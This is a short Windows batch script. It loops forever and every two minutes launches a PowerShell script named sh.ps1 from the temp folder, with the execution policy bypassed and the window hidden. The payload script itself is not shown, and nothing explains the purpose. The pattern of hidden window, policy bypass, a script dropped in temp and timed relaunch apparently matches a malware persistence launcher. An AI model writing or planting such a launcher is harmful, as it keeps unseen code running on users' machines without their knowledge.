@echo off
:loop
   powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%temp%\sh.ps1"
   timeout /t 120 >nul
goto loop
